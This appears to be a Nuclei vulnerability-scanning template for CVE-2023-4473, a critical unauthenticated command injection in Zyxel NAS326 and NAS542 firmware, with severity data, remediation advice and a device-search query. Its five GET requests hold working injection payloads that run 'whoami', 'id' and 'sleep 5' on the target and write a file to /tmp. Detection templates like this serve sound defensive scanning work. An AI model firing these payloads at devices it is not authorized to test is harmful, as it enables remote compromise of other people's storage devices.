id: CVE-2023-4473

info:
  name: Zyxel NAS326 and NAS542 Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    A command injection vulnerability in the web server of the Zyxel NAS326 firmware version V5.21(AAZF.14)C0 and NAS542 firmware version V5.21(ABAG.11)C0 could allow an unauthenticated attacker to execute some operating system (OS) commands by sending a crafted URL to a vulnerable device.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary commands on the affected device.
  remediation: |
    Apply the latest firmware updates provided by Zyxel to mitigate the command injection vulnerability (CVE-2023-4473).
  reference:
    - https://bugprove.com/knowledge-hub/cve-2023-4473-and-cve-2023-4474-authentication-bypass-and-multiple-blind-os-command-injection-vulnerabilities-in-zyxel-s-nas-326-devices/
    - https://github.com/Tig3rHu/Awesome_IOT_Vul_lib
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-4473
    cwe-id: CWE-78
    epss-score: 0.00075
    epss-percentile: 0.34105
    cpe: cpe:2.3:o:zyxel:nas326_firmware:*:*:*:*:*:*:*:*
  metadata:
    vendor: zyxel
    product: nas326_firmware
    fofa-query: app="zyxel-nas326"

http:
  - method: GET
    path:
      - "/cmd,/ck6fup6/system_main/whoami/favicon.ico"

    matchers:
      - type: word
        words:
          - "root"
        part: body

  - method: GET
    path:
      - "/cmd,/ck6fup6/portal_main/pkg_init_cmd/register_main/setCookie?pkgname=myZyXELcloud-Agent&cmd=id&content="

    matchers:
      - type: word
        words:
          - "uid="
        part: body

  - method: GET
    path:
      - "/cmd,/ck6fup6/zylog_main/show_logging_entries/favicon.ico?type=;sleep 5"

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
        part: body

  - method: GET
    path:
      - "/cmd,/ck6fup6/zypkg_main/pkg_install/favicon.ico?pkgname=a&active=b&volumeID=c&id>/tmp/bugproved"

    matchers:
      - type: word
        words:
          - "bugproved"
        part: body

  - method: GET
    path:
      - "/cmd,/ck6fup6/time_machine_main/setTimeMachineStatus?whoami=admin&active=true&target_share=;sleep 5"

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
        part: body
